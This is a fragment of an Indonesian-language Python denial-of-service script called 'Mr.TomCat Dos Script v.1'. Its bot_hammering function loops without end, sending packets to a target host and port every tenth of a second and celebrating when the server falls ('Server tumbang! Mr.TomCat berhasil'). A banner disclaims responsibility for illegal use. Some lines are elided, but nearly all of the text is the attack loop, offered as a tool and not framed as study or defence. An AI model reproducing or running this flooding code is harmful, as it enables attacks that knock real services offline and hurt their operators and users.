...
def bot_hammering(url):
	try:
		while True:
			...
			print("\033[94mMr.TomCat Memukuli Target...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Mr.TomCat Memukuli Target!--> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mBerhenti<->ah\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mServer tumbang! Mr.TomCat berhasil\033[0m")
...
╔╝█████║█║██║██║█║
║██████║█████████║
	Pukulan Mr.TomCat Dos Script v.1
	Pembuat tidak bertanggung jawab jika digunakan untuk melawan hukum.
	Pembuat tidak bertanggung jawab jika target sakit :),
